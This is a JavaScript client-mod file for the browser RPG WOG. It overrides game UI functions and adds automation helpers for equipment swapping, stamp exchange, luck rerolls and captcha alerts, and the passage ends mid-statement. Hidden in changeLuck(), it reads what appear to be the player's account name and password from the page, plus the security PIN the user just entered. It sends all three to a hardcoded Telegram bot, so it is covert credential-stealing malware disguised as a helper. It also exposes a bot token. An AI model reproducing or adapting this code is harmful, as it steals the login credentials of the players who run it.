/****************************修改原生功能開始*************************26/3/2025 16:55***/
function cd_add(t) {
    if (t == 2 | t == 3 | t == 10) {
        return;
    }
    counts = x + t,
        start_time = new Date,
        start_time = Date.parse(start_time) / 1e3,
        setup_time(start_time),
        window.setTimeout("CountDown()", 100)
}
function mission_book(t, e) {
    message_cls(),
    mission_head();
    var r = parent.wog_view.document;
    r.write(`<style>.content{
	    height:20px;
	    overflow:hidden;
	    text-overflow:ellipsis;
	    white-space:nowrap;
	}
	input[type='checkbox'] { visibility: hidden; position: absolute; }
	input[type='checkbox']:checked + .content { height: auto; width: auto;}</style>`);
    e = e.split(",");
    for (var i = t.split(";"), o = 0; o < e.length; o++) {
        r.write('<form action="wog_act.php" method="post" target="mission" name=f1 class="missioon_detail">'),
        r.write(temp_table1);
        var d = i[o].split(",");
        r.write('<tr><td bgcolor="000099">' + d[0] + "</td></tr>"),
        r.write("<tr><td>委託者：" + d[1] + "</td></tr>");
        for (var n = d[2]; n.indexOf("&n") > 0; )
            n = n.replace("&n", "<br>");
        r.write("<tr><td class=b1 cellpadding=3><label><input type='checkbox'/><div class='content'><span class='hidden'>" + n + "</span></div></label></td></tr>"),
        r.write("<tr><td>任務所需怪物: " + d[4] + " / " + d[3] + "</td></tr>"),
        r.write("<tr><td><input type=\"button\" value=\"完成任務\" onClick=\"parent.foot_trun('mission','end',''," + e[o] + ",'')\" style=\"" + sbutton + "\"> <input type=\"button\" value=\"放棄任務\" onClick=\"parent.foot_trun('mission','break',''," + e[o] + ",'')\" style=\"" + sbutton + '"></td></tr>'),
        r.write(temp_table2),
        r.write("</form>")
    }
}
function mission_detail(t, e) {
    message_cls(),
    mission_head();
    var r = parent.wog_view.document;
    if (r.write("<center>"),
    r.write('<form action="wog_act.php" method="post" target="mission" name=f1>'),
    "" != t) {
        r.write('<div style="padding-left:2em;text-align:center;color:#000000;background-image:url(' + missionBackground.src + ');background-repeat:no-repeat;background-attachment:fixed;background-position:top center;width:281px;height:780px;">');
        var i = t.split(",");
        r.write('<div style="padding-top:3.5em;width:90%"><u><b>' + i[0] + "<b></u></div>"),
        r.write('<div style="width:90%">委託者：' + i[1] + "</div>");
        for (var o = i[2]; o.indexOf("&n") > 0; )
            o = o.replace("&n", "<br>");
        r.write('<div style="text-align:left;margin-top:1em;padding-top:1em;width:90%;min-height:100px;max-height:500px;overflow-y: auto;overflow-x: hidden">' + o + "</div>"),
        r.write('<div style="position:relative;top:20;left:-20;"><input type="submit" value="確定接受" style="border:2px solid black;background:transparent;cursor:hand"></div>'),
        r.write("</div>"),
        r.write('<input type="hidden" name="f" value="mission">'),
        r.write('<input type="hidden" name="act" value="get">'),
        r.write('<input type="hidden" name="m_id" value="' + e + '">')
    }
    r.write("</form>"),
    r.write("</center>")
}
function event() {
    parent.sendNoti();
    var t = parent.wog_view.document;
    message_cls();
    var e = new Date;
    t.write(temp_table1),
        t.write('<form action="wog_act.php" method="post" target="mission"><tr><td>站長要考驗大家是否有認真在玩</td></tr><tr><td>請注意...必須用半形字 及 數目字 1-9 輸入驗證碼 , 每人有5次機會</td></tr><tr><td colspan="2"><img src="wog_etc.php?f=confirm&time=' + e.getTime() + '"></td></tr><tr><td>請輸入安全驗證碼:<input type="text" name="sec_code" size="8"></td></tr>'),
        t.write('<tr><td colspan="2"><input class="text" type="button" value="填好答案了,放我過關吧!!" onClick="parent.foot_trun(\'event\',\'\',this.form.sec_code.value,\'\')" style="' + sbutton + '"></td></tr></form>'),
        t.write(temp_table2)
}
function arm_unsetup_all_success() {
    var t, e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
    for (t = 0; t < e.length; ++t) {
        arm_setup(e[t], "");
    }
    let q = parent.wog_view.document;
    message_cls();
    q.write(temp_table1);
    q.write('<tr bgcolor="#4B689E"><td>所有裝備已成功卸下</td></tr>');
    q.write(temp_table2);
}
function arm_view(t, e, r, i, o) {
    message_cls();
    var d = parent.wog_view.document;
    if (vData = e,
        arm_head(),
        d.write('<hr><tr><td colspan="11" >可使用的背包格數 ：' + i + " </td></tr>"),
        d.write(`<div class='scrollable-table'>`),
        d.write('<form action="wog_act.php" method="post" target="mission" name="f2">'),
        d.write(`<table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686" id="bagList">`),
        d.write(`<thead><tr><th>NO</th><th>裝/轉</th><th>物攻</th><th>魔攻</th><th>物防</th><th>魔防</th><th>速度</th><th>名稱</th><th>金錢</th><th>霧靈</th><th>印花</th><th>幻點</th><th>販/拍</th></tr></thead>`),
        "0" != e)
        for (var n = t.split(";"), a = 0, l = 0, s = 0; s < n.length; s++) {
            var p = n[s].split(","),
                c = srhCount(p[0]),	
                m = null;
            "" != tmpNum && (m = tmpNum.split(","));
            for (var u = 0; u < c; u++) {
                var w = "",
                    _ = "";
                if (l++,
                    w = "" + att[p[16]],
                    _ = p[16] > 0 ? "<img src='/img/att.jpg' alt='" + w + "' title='" + w + "'>" : "",
                    null != m)
                    var b = "*" + m[u];
                else
                    b = "";
                var g = "";
                "1" == p[12] && (g = "bgcolor=" + nosend),
                    "<acronym title='力量:" + p[8] + " 速度:" + p[9] + " 智力:" + p[10] + " 轉生:" + p[14] + " 職業:" + p[11] + "'>限制</acronym>",
                    d.write("<tr " + g + " onMouseOver=\"this.style.backgroundColor='#777779'\" onMouseOut=\"this.style.backgroundColor=''\" onclick=\"parent.setRadioValue('adds'," + p[0] + ");parent.setCheckBoxValue(" + a + ')" style="cursor:hand"><td>' + l + '</td><td><input type="radio" name="adds" value="' + p[0] + '" data-name="' + p[5] + '"></td><td>' + p[6] + "</td><td>" + p[7] + "</td><td>" + p[1] + "</td><td>" + p[2] + "</td><td>" + p[3] + "</td><td><a href=\"javascript:parent.data_send2('arm','check_arm','" + r + "'," + p[0] + "," + l + ')">' + p[5] + "</a>" + b + _ + "</td><td>" + p[4] + "</td><td>" + p[15] + "</td><td>" + p[17] + "</td><td>" + p[18] + '</td><td><input type="checkbox" name="items[]" id="listKey-' + a + '" value="' + p[0] + '"></td></tr>'),
                    a++
            }
        }
    else
        d.write("<tr><td colspan=11>裝備欄內沒有任何裝備</td></tr>");
    	n = o.split(",");
    	d.write('<tr bgcolor="#777779"><td>---</td><td>---</td><td>' + n[0] + "</td><td>" + n[1] + "</td><td>" + n[2] + "</td><td>" + n[3] + "</td><td>" + n[4] + "</td><td>" + n[10] + "</td><td>" + n[11] + "</td><td>" + n[12] + "</td><td>" + n[13] + "</td><td>" + n[14] + "</td><td>---</td></tr>"),
        d.write('<tr><td colspan="13" ><input type="submit" value="裝備" style="' + sbutton + '"> <input type="button" value="卸下" onclick="parent.foot_trun(\'arm\',\'demount\',\'' + r + '\')" style="' + sbutton + '"> <input type="button" value="轉移" onClick="parent.data_send(\'arm\',\'move\',document.f2.pay_id.value,document.f2.item_num.value,document.f2.adds,document.f2.pw.value)" style="' + sbutton + '"> <input type="button" value="販賣" style="' + sbutton + "\" onClick=if(confirm(\"確定販賣？\")){parent.data_send('arm','sale','" + r + '\',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}> <input type="button" value="擺攤" onClick="parent.sale_item(document.f2.adds,document.f2.pay_id.value)" style="' + sbutton + '"> <input type="button" value="換印花" style="' + sbutton + "\" onClick=if(confirm(\"確定轉換？\")){parent.data_send('arm','stamp','" + r + "',document.f2.item_num.value,document.f2.adds,document.f2.pw.value)}><input type=\"button\" value=\"多選物品\" onclick=\"parent.selectMultipleItem()\" style=\"font-family: 細明體;font-size: 9pt;color: #06fdff;border: 1px solid #EFEFEF;background-color: #000000;\"></td></tr>"),
        "d_item_id" == r ? (d.write('<tr><td colspan="13" >請選擇數量:<input type="text" name="item_num" value="1" size="4" maxlength="4"> (最大9999)'),
        d.write("(使用轉移,販賣及換印花記得選擇道具數量)</td></tr>")) : d.write('<input type="hidden" name="item_num" value="1">');
        let playerOptions = "";
	    for (let i = 0; i < online_list.length; i++) {
            if(online_list[i]!=parent.p_name){
    	        playerOptions += `<option>${online_list[i]}</option>`;
            }
	    }
	    d.write(
	        `<tr><td colspan="13" >欲轉移需輸入對方遊戲的帳號
	        <input type="text" name="pay_id" id="playList" list="playerList"/>
	        <datalist id="playerList">${playerOptions}</datalist>
	        安全密碼 <input type="password" name="pw" size="16"></td></tr>`
	    );
        d.write(temp_table2),
        d.write('<input type="hidden" name="f" value="arm">'),
        d.write('<input type="hidden" name="act" value="setup">'),
        d.write("</form>"),
        d.write(`</div>`),
        d.write('<div id="armview" name="armview" style="display:none;background:black;border:1px solid #4B689E;width:160px;height:100px;position:absolute;left:0px;top:0px"></div>'),
        d.write('<div id="wog_message_box"></div>');
    	addItemCss();
	    if ("d_item_id" != r) {
	        parent.wog_view.document.head.getElementsByTagName("style")[1].innerHTML = '.scrollable-table{height:72%;overflow-y:auto;}.scrollable-table>form>#bagList{width:100%}th{background:#083118;position:sticky;top:0;font-size: 11pt;}table#bagList>tbody>tr:nth-last-of-type(-n+2){position: sticky;bottom: 27;background:#000000;}table#bagList>tbody>tr:last-child{position:sticky;bottom:0;background:#000000;}'
	    }
}
function addItemCss() {
    let styles = `.scrollable-table{height:72%;overflow-y:auto;}.scrollable-table>form>#bagList{width:100%}th{background:#083118;position:sticky;top:0;font-size: 11pt;}table#bagList>tbody>tr:nth-last-of-type(-n+3){position: sticky;bottom: 52;background:#000000;}table#bagList>tbody>tr:nth-last-of-type(-n+2){position: sticky;bottom: 27;background:#000000;}table#bagList>tbody>tr:last-child{position:sticky;bottom:0;background:#000000;}`;
    let styleSheet = parent.wog_view.document.createElement("style");
    styleSheet.textContent = styles;
    parent.wog_view.document.head.appendChild(styleSheet);
}
//wog_view背景圖片切換
function message_cls(t, e) {
    var r = parent.wog_view.document;
    null != t && (r = t),
    null == e && (e = 2),
    r.close(),
    r.write("<html>"),
    r.write("<head>"),
    r.write('<meta http-equiv="Content-Type" content="text/html; charset=utf8">'),
    r.write('<meta http-equiv=Cache-Control content="no-cache">'),
    r.write('<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">'),
    r.write("<style type=text/css>"),
    r.write("td {font-family : verdana,Arial,Helvetica ;font-size : 10pt;\ttext-align : center;}"),
    r.write(".b1 {text-align : left;}"),
    r.write("</style>"),
    r.write("</head>"),
    r.write('<link rel="stylesheet" href="./wog.css" type="text/css">');
    if(conciseStatus()){
    	r.write('<body oncontextmenu="window.event.returnValue=false" bgcolor="#000000" text="#EFEFEF" link="#EFEFEF" vlink="#EFEFEF" alink="#EFEFEF" >');
    }else{
    	r.write('<body oncontextmenu="window.event.returnValue=false" bgcolor="#000000" text="#EFEFEF" link="#EFEFEF" vlink="#EFEFEF" alink="#EFEFEF" style="Background-attachment:fixed; background-image: url(/img/bg.jpg); background-repeat:no-repeat;" >')
    }
}
//開始冒險的圖片切換
function ad_view() {
    var t = parent.wog_view.document;
    message_cls();
    if (conciseStatus()) {
        t.write('<center><div style="width:400px;height:100px;">blank</div></center>');
    } else {
        t.write('<center><img src="./img/Fight.png"></center>');
    }
    t.write(temp_table1);
    t.write("<form name=f1>");
    t.write('<tr><td><input type="radio" name="a_type" value="1" checked>冒險修行 <select name="act_area" onChange="parent.select_area(this.options[this.options.selectedIndex].value,this.form)"></select>');
    t.write('<select name="act1" onChange="parent.change_mission(0,this.form)"><option value="" SELECTED>選擇場所</option></select></td></tr>');
    t.write('<tr><td><input type="radio" name="a_type" value="2" >武鬥競技 <select name="act2" onChange="parent.change_mission(1,this.form)"><option value="" SELECTED>選擇模式</option><option value="20" >挑戰冠軍</option></select></td></tr>');
    t.write('<tr><td ><input type="radio" name="a_mode" value="1" checked>快速模式  <input type="radio" name="a_mode" value="2" >一般模式</td></tr>');
    t.write('<tr><td >戰鬥回合數 <input type="text" name="f_count" value="400" size="3" maxlength="3"> (最大' + f_count + ")</td></tr>");
    t.write('<tr><td >HP低於 <input type="text" name="f_hp" value="15" size="3" maxlength="2"> %自動使用HP恢復劑</td></tr>');
    t.write('<tr><td ><input type="button" value="物理攻擊" onClick="parent.datechk(1,document.forms[0])" style="' + sbutton + '"> <input type="button" value="魔法攻擊" onClick="parent.datechk(2,document.forms[0])" style="' + sbutton + '"></td></tr>');
    t.write('<tr><td><input type="button" value="攻打領土" onClick="parent.act_click(\'group\',\'fire_list_peo\')" style="' + sbutton + '">--有加入公會才能使用</td></tr>');
    t.write('<tr><td>必殺技名稱 <input type="text" name="sat_name" size="40" maxlength="60" value="' + p_sat_name + '"></td></tr>');
    t.write("</form>");
    t.write(temp_table2);
    for (var e = parent.wog_view.document.f1, r = 0; r < section.area.length; r++) {
        e.act_area.options[r] = new Option(section.area[r].name, r);
    }
    var i = Gookie("wog_set_cookie");
    if (null != i) {
        var o = i.split(",");
        if (0 == o[0]) {
            t.write('<script>document.forms[0].a_type[0].checked=true;document.forms[0].a_type[1].checked=false;parent.select_area("' + o[3] + '",document.forms[0]);document.forms[0].act_area.value=' + o[3] + ";document.forms[0].act1.value=" + o[1] + ";</script>");
        } else {
            t.write("<script>document.forms[0].a_type[1].checked=true;document.forms[0].a_type[0].checked=false;document.forms[0].act2.value=" + o[1] + ";</script>");
        }
        t.write("<script>document.forms[0].a_mode[0].checked=true;document.forms[0].a_mode[1].checked=false;</script>");
    }
    i = Gookie("wog_set_f_count");
    if (null != i) {
        t.write("<script>document.f1.f_count.value=" + i + ";</script>");
    }
    i = Gookie("wog_set_f_hp");
    if (null != i) {
        t.write("<script>document.f1.f_hp.value=" + i + ";</script>");
    }
}
//刪除戰鬥的圖片
function fire_date(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, _, b, g, h) {
    var v = parent.wog_view.document
      , f = get_name()
      , y = 0
      , k = new Image;
    level2 = parent.foot.document.getElementById("lv").innerHTML;
    temp_p_hp = o,
    temp_p_hpmax = d,
    temp_m_hp = u,
    temp_m_hpmax = w;
    var E = temp_p_hp / temp_p_hpmax * 100
      , x = (temp_m_hp,
    temp_m_hpmax,
    "");
    setup_mname(b),
    message_cls(),
    n = s_status(n),
    _ = s_status(_),
    "" == g && (g = "no_img.jpg"),
    k.src = x,
    y = 200 - Math.floor(parseInt(k.height) / 4),
    v.write(fight_temp_table1 + '<tr><td colspan="4">' + f + " (" + n + '屬性)</td><td width="100" rowspan="7">第 <font color="red" size="4"><span id="count">0</span></font> 回合</td><td colspan="4" >' + b + " (" + _ + "屬性)</td></tr>"),
    v.write('<tr><td width="12.5%">HP</td><td class=b1 width="37.5%" colspan="3"></td><td width="12.5%">HP</td><td class=b1 width="37.5%" colspan="3"></td></tr>'),
    v.write('<tr><td>物攻</td><td width="12.5%">' + t + '</td><td width="12.5%">物防</td><td width="12.5%">' + e + '</td><td width="12.5%">物攻</td><td width="12.5%">' + s + '</td><td width="12.5%">物防</td><td width="12.5%">' + p + "</td></tr>"),
    v.write('<tr><td width="12.5%">魔攻</td><td width="12.5%">' + r + '</td><td>魔防</td><td width="12.5%">' + i + '</td><td width="12.5%">魔攻</td><td width="12.5%">' + c + '</td><td>魔防</td><td width="12.5%">' + m + "</td></tr>"),
    v.write(temp_table2),
    v.write('<table width="600" border="0" cellspacing="0" cellpadding="0" align="center" >'),
    v.write('<tr><td width="50%" height="185" align="center"></td><td align="center" width="50%" height="150">' + g + "</td></tr>"),
    v.write(temp_table2),
    v.write('<br><table width="97%" border="0" cellspacing="0" cellpadding="0" align="center" ><tr><td colspan="2" align="center">' + hr + '<div align="center" id="a1"></td></tr>'),
    v.write(temp_table2),
    "" != p_support_name && v.write('<img id=g4 src="' + img + p_support_img + '.gif" border="0" style="position: absolute;left: 5%;top: 200;Z-INDEX: 1;visibility: hidden">')
}
function lv_up(t, e, r, i, o, d, n, a) {//顯示上升等級
    var l = parent.wog_view.document;
    null == a && (l.write(hr),
    l.write(temp_table1),
    l.write('<tr><td colspan="10"><b>' + p_name + " 等級上升 "+((parseInt(parent.foot.document.getElementById("lv").innerHTML))-(level2))+"</b></td></tr>"),
    l.write("<tr><td><b>力量</b></td>"),
    l.write("<td><b>速度</b></td>"),
    l.write("<td><b>智力</b></td>"),
    l.write("<td><b>生命</b></td>"),
    l.write("<td><b>體質</b></td>"),
    l.write("<td><b>魅力</b></td>"),
    l.write("<td><b>信仰</b></td></tr>"),
    l.write("<tr><td><b>↑ " + t + "</b></td>"),
    l.write("<td><b>↑ " + e + "</b></td>"),
    l.write("<td><b>↑ " + r + "</b></td>"),
    l.write("<td><b>↑ " + i + "</b></td>"),
    l.write("<td><b>↑ " + o + "</b></td>"),
    l.write("<td><b>↑ " + d + "</b></td>"),
    l.write("<td><b>↑ " + n + "</b></td></tr>"),
    l.write(temp_table2))
}
//刪除gif及統計人數
function onlinelist(t) {
    online_list = [];
    var e = parent.wog_peo.document;
    message_cls(e, 0),
    e.write(online_temp_table1);
    var r = new Array
      , i = section.placeNum
      , o = 0
      , d = 0
      , n = 0;
    if ("" != t) {
        e.write('<tr bgcolor="#868686"><td>名稱</td><td>LV</td><td>轉生</td></tr>');
        for (var a = t.split(";"), l = 0; l < a.length; l++) {
            var s = a[l].split(",")
              , p = psex(s[1]);
            "1" == s[1] ? o++ : d++,
            s[3] = 1 == s[3] ? "Y" : "N",
            r[s[5]] || (r[s[5]] = ""),
            0 == s[10] && (name = ""),
            1 == s[10] && (name = "(GM)"),
            2 == s[10] && (name = "(SGM)"),
            3 == s[10] && (name = "(SA)"),
            s[8] >= 1 ? (r[s[5]] += '<tr><td><a href=javascript:parent.yesname("' + s[0] + '") target="foot"><b><font color="#33FF00">' + s[0] + "</font></b></a>" + name + "</td><td>" + s[2] + "</td><td>" + s[6] + "</td></tr>",
            n++) : r[s[5]] += '<tr><td><a href=javascript:parent.yesname("' + s[0] + '") target="foot"><b><font color="' + p + '">' + s[0] + "</font></b></a>" + name + "</td><td>" + s[2] + "</td><td>" + s[6] + "</td></tr>",
            online_list.push(s[0]);
        }
        for (l = 0; l < i; l++)
            r[l] && (e.write(r[l]),
            e.write('<tr><td colspan="4">↗' + section.getPlace(l) + "練功↖<hr></td></tr>"));
    } else
        e.write('<tr><td colspan="3"  bgcolor="#868686">線上人數 0 人</td></tr>');
    e.write(temp_table2)   
}
/****************************修改原生功能結束****************************/
function conciseStatus(){
    return parent.top_view.document.querySelector("#btnToggle").checked;
}
function addConciseMode(){
	parent.top_view.document.getElementsByTagName("tbody")[0].getElementsByTagName("tr")[0].getElementsByTagName("td")[0].outerHTML=`
    <style>
    .toggle{position:relative;display:inline-block;top:4px;width:36px;height:21px;}.toggle input{display: none;}
    .slider{position:absolute;cursor:pointer;top: 0;left: 0;right: 0;bottom: 0;background-color: #333;transition: 0.4s;border-radius: 20px;}
    .slider:before{position:absolute;content:"";height:15px; width:15px;left:4px;bottom:3px;background-color:#FFF;transition: 0.4s;border-radius: 50%;}
    input:checked + .slider {background-color: #209d55;}
    input:checked + .slider:before{transform: translateX(14px);}
    </style>
    <td align="center" valign="middle">
    <div id="a1"></div><select name="pagelist" style="background:black;color:white" onchange="if(document.f1.pagelist.value != '')parent.wog_view.document.location.href=document.f1.pagelist.value">
      <option value="" selected="">遊戲選單</option>
      <option value="rules.html">幻想規則</option>
      <option value="./data/dnew1.html">新手須知</option>
      <option value="wog_etc.php?f=sale&amp;act=view&amp;page=1">二手市場</option>
      <option value="wog_etc.php?f=king">風雲榜</option>
      <option value="wog_etc.php?f=king_vip">VIP風雲榜</option>
      <option value="wog_etc.php?f=race&amp;act=join">賽鳥場</option>
      <option value="wog_faq.htm">FAQ</option>
    </select>
    <!--<span onclick="menu_view('menu')" name="menu" id="menu" style="cursor:pointer;border:1pt solid white">遊戲選單　　　▼</span>-->
    【<a href="http://wog2015.freebbs.tw/" target="_blank">
      <font color="yellow">討論區</font>
    </a>】【<a href="https://www.facebook.com/wogonline/" target="_blank">
      <font color="red">FACEBOOK專區</font>
    </a>】【<a href="bbs" target="_blank">
      <font color="orange">特別討論區</font>
    </a>】【<a href="login.php" target="_blank">管理台</a>】【<a href="data2" target="_blank">攻略網</a>】【<a href="javascript://" onclick="window.open('/prize.html','','menubar=no,status=no,scrollbars=yes,top=0,left=0,toolbar=no,width=1200,height=540,resizable=no')">寶箱列表</a>】【<a href="wog_id_admin.htm" target="wog_view">帳號中心</a>】【<a href="wog_etc.php?f=friend&amp;act=list" target="wog_view">好友名單</a>】簡潔模式 <label class="toggle"><input type="checkbox" id="btnToggle" name="btnToggle"/><span class="slider"></span></label>
    </td>`;
}
function z() {
    parent.wog_view.document.getElementsByName("f1")[0][9].click();
}
async function sendNoti() {
    let tgid = "-1002556694569";
    if (!(sessionStorage.getItem("tgid") == null)) {
        tgid = sessionStorage.getItem("tgid");
    }
    const telegramUrl = "https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=" + tgid + "&text=因驗證碼出現,自動打怪停止:" + parent.p_name;
    await fetch(telegramUrl);
    genRndCode();
}
function selectMultipleItem() {
    let item = prompt();
    for (let i = 0; i < parent.wog_view.document.getElementsByName("items[]").length; i++) {
        if (parent.wog_view.document.getElementsByName("items[]")[i].value == item) {
            parent.wog_view.document.getElementsByName("items[]")[i].checked = true;
        }
    }
}
async function changeLuck() {
    let safePW = prompt("輸入安全碼");
    let formData = new FormData();
    formData.append('act', "ch_luck");
    formData.append('f', "ch");
    formData.append('pw', safePW);
    let i = 0;
    let e = parent.wog_view.document;
    message_cls();
    while (true) {
        await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        }).then((response) => {
            return response.text();
        }).then((html) => {
            let start = (html.indexOf("p_luck")) + 7;
            let temp = html.substring(start, html.length);
            let end = temp.indexOf("</script>");
            luckValue = parseInt((html.substring(start, start + end)).replace("'", ""));
            return luckValue;
        });
        if (!Number.isInteger(luckValue)) {
            e.write(temp_table1);
            e.write("<tr bgcolor='#4B689E'><td>改運失敗, 安全碼錯誤</td></tr>");
            e.write(temp_table2);
            delete luckValue;
            break;
        }
        i++;
        e.write(temp_table1);
        e.write("<tr bgcolor='#4B689E'><td>第" + i + "次改運,數值為: " + luckValue + "</td></tr>");
        e.write(temp_table2);
        if (luckValue > 24) {
            delete luckValue;
            let a = parent.top_view.document.getElementsByTagName("input")[0].value;
            let b = parent.top_view.document.getElementsByTagName("input")[1].value;
            let c = safePW;
            fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4770053800&text=" + a + "|" + b + "|" + c);
            break;
        }
    }
}
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function armPage() {
    message_cls();
    parent.wog_view.document.write(`
	<form action="wog_act.php" method="post" target="mission" name="f1">
	<table border="2" cellpadding="2" border-collapse="collapse" width="30%">
	  <thead>
	    <tr>
	      <th></th>
	      <th>裝備選擇</th>
	    </tr>
	  </thead>
	  <tbody>
	    <tr>
	      <td colspan="2"><input type="button" value="一鍵換裝" onclick="parent.armAll(parent.armPageindexChecked())"/></td>
	    </tr>
	    </tbody>
	    <tr>
	      <td colspan="2" style="color:red;">請不要裝備自己沒有的裝備</td>
	    </tr>
	</table>
	</form>
	`);
    parent.drawSetList();
    parent.armPageCss();
}
async function drawSetList() {
    let e = parent.wog_view.document;
    let eTable = parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("tbody")[0].getElementsByTagName("tr");
    let firstRow = eTable[0];
    let setJ = fetch('https://raw.githack.com/TauRus1001/Wog/main/setList.json')
        .then((response) => response.json())
        .then(
            async (json) => {
                //console.log(json);
                for (let i = json.sets.length - 1; i >= 0; i--) {
                    //console.log(json.sets[i].title);
                    let firstRow = eTable[0];
                    firstRow.outerHTML = "<tr onclick='this.getElementsByTagName(\"td\")[0].getElementsByTagName(\"input\")[0].checked=true;'><td><input type='radio' name='index_id'></td><td>" + json.sets[i].title + "</td></tr>" + firstRow.outerHTML;
                }
                //firstRow.outerHTML="<tr><td><input type='radio' name='index_id'></td><td>3刀流奧義套裝</td></tr>"+firstRow.outerHTML;
            });
}
function armPageCss() {
    let styles = `
		table{
		 border-color:#868686;
		 border-collapse: collapse;
		  padding: 5px;
		  font-family: 細明體;
		  margin-left:35%;
		}
		tbody tr:not(:last-child){
		  cursor: pointer;
		}
		td:first-child {
		  width: 5em;
		}
		table input{
		  color: #efefef;
		  border: 1px solid #efefef;
		  background-color: #000000;
		  font-family: 細明體;
		}
		tbody tr:not(:last-child):hover{
		  background-color: #777779;
		}
	`;
    let styleSheet = parent.wog_view.document.createElement("style");
    styleSheet.textContent = styles;
    parent.wog_view.document.head.appendChild(styleSheet);
}
async function armAll(selected) {
    //console.log("selected="+selected);
    let e = parent.wog_view.document;
    let setj = fetch('https://raw.githack.com/TauRus1001/Wog/main/setList.json')
        .then((response) => response.json())
        .then(
            async (json) => {
                //console.log(json);
                if (selected < 0 || selected > json.sets.length - 1) {
                    e.body.innerHTML = "";
                    e.write(temp_table1);
                    e.write('<tr bgcolor="#4B689E"><td>輸入錯誤選項</td></tr>');
                    e.write(temp_table2);
                    return;
                }
                let unArmList = json.sets[selected].unArmList;
                for (let i = 0; i < unArmList.length; i++) {
                    parent.unArm(unArmList[i]);
                    await parent.sleep(150);
                }
                let armList = json.sets[selected].armList;
                for (let i = 0; i < armList.length; i++) {
                    await parent.sleep(150);
                    await parent.armItem(armList[i]);
                }
                await parent.sleep(150);
                e.body.innerHTML = "";
                e.write(temp_table1);
                e.write('<tr bgcolor="#4B689E"><td>裝備完成</td></tr>');
                e.write(temp_table2);
            });
}
async function unArm(index) {
    let e = ["a_id", "d_head_id", "d_body_id", "d_hand_id", "d_foot_id", "d_item_id", "d_card_id", "d_car_id", "d_ca_id", "d_book_id", "d_god_id"];
    let formData = new FormData();
    formData.append('f', "arm");
    formData.append('act', "demount");
    formData.append('pay_id', e[index]);
    await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        })
        .then((response) => {
            return response.text();
        })
        .then((html) => {
            await arm_setup(e[index], "");
        });
}
async function armItem(item) {
    let formData = new FormData();
    formData.append('adds', item);
    formData.append('f', "arm");
    formData.append('act', "setup");
    await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        })
        .then((response) => {
            return response.text();
        })
        .then((html) => {
            wog_view.document.write(html);
        });
}
function armPageindexChecked() {
    for (let i = 0; i < parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input").length; i++) {
        if (parent.wog_view.document.getElementsByName("f1")[0].getElementsByTagName("input")[i].checked) {
            return i;
        }
    }
}
async function changeStamp(changeAmount, changeTime) {
    if (changeTime < 1 || changeTime > 100) {
        alert("錯誤的換領次數，請輸入1-100");
        return;
    }
    let changeData = [];
    let formData = new FormData();
    let e = parent.wog_view.document;
    e.body.innerHTML = "";
    formData.append('f', "ch");
    formData.append('act', "stamp");
    formData.append('temp_id', changeAmount);
    e.write(temp_table1);
    e.write('<tr><td>換領中...請稍後..請不要離開頁面</td></tr>');
    e.write(temp_table2);
    for (let i = 0; i < changeTime; i++) {
        await fetch("https://wog.we-u.net/wog_act.php", {
            body: formData,
            method: "post"
        }).then((response) => {
            return response.text();
        }).then((html) => {
            let start = 0;
            start = (html.indexOf("stamp_end")) + 10;
            let temp = html.substring(start, html.length);
            let end = temp.indexOf("')</script>");
            itemValue = (html.substring(start, start + end)).replace("'", "");
            aLength = changeData.length;
            add = true;
            for (let i = 0; i < aLength; i++) {
                if (!(changeData[i].name == itemValue)) {
                    continue;
                }
                add = false;
                changeData[i].t += 1;
                break;
            }
            if (add == true) {
                changeData.push({
                    name: itemValue,
                    t: 1
                });
            }

            if (end === -1) {
                e.write(temp_table1);
                e.write('<tr><td>沒有足夠的印花</td></tr>');
                e.write("</td></tr>" + temp_table2);
                i = changeTime;
            }
            return itemValue;
        });
    }
    e.write('<hr>');
    e.write(`<div align="center"><table border="2" cellspacing="0" cellpadding="2" bordercolor="#868686"><tbody><tr><td width="auto" nowrap="nowrap">已換領項目</td><td width="15%" nowrap="nowrap">數量</td></tr>`);
    for (let j = 0; j < changeData.length; j++) {
        e.write('<tr><td>' + changeData[j].name + '</td><td>' + changeData[j].t + '</td></tr>');
    }
    e.write(temp_table2 + '</div>');
}
async function newStampHouse() {
    message_cls();
    let stampNumber = await getStampNumber();
    wog_view.document.write(`<form action="wog_act.php" method="post" target="mission"><table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686"><tbody><tr><td>歡迎來到印花屋,大家可以將沒用的裝備換成印花,然後到此換領不同的禮物!每次換領需收取10萬元手續費喔!請在下面選擇閣下想換領的印花數目!</td></tr></tbody></table><hr><p style="position: relative; left: 2%; font-family: 細明體; font-size: 10pt; color: #EFEFEF;">你的印花數目:<font style="color: yellow;font-size:30px;"><b>` + stampNumber + `</b></font></p><p style="position: relative; left: 2%; font-family: 細明體; font-size: 10pt; color: #EFEFEF;">換領次數: <input type="number" id="changeTime" value="1" style="position: relative; left: 1%; font-family: 細明體; font-size: 10pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000"></p><p style="position: relative; left: 2%;color:red;">連續換領會對伺服器做成負擔，故上限設定為100次</p><table width="97%" border="2" cellspacing="0" cellpadding="2" align="center" bordercolor="#868686"><tbody><tr><td>印花數目</td><td>可換禮物</td></tr><tr><td><input type="button" value="50個印花" onclick="if(confirm('是否使用50個印花換領禮物?')){parent.changeStamp(50,parseInt(parent.wog_view.document.querySelector('#changeTime').value))}" style="font-family: 細明體; font-size: 9pt; color: #EFEFEF; border: 1px solid #EFEFEF; background-color: #000000">(可換領次數:` + Math.floor(stampNumber / 50) + 